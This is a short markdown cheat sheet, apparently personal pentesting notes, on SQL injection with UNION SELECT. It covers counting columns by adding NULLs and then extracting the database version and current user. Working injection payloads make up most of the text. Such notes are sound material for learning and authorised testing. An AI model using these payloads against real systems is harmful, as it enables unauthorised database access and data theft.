# SQL Injection


## Union Select
When working with union select, you will want to determine the number of query within the table. You can do this with the following

**NOTE THAT `-- -` WONT COMMENT ON ALL DBMS.... AMEND THIS DEPENDING ON YOUR USE CASE** 

`' UNION SELECT NULL-- -`
`' UNION SELECT NULL,NULL-- -`

Essentially, you can add nulls until it errors about columns not aligning.
From there you can start pulling data like so: 

**Return VERSION**
`'UNION SELECT NULL,@@VERSION-- -`

**RETURN CURRENT USER**
`'UNION SELECT NULL,CURRENT_USER-- -`


## Resources

- [https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)